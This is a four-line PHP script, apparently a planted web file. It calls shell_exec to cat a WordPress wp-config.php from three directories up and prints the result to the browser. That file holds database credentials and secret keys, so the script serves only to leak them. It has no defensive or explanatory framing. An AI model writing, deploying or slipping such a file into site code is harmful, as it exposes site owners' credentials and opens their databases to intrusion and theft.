<?php

  $output = shell_exec('cat ../../../wp-config.php');
  echo "<pre>$output</pre>";
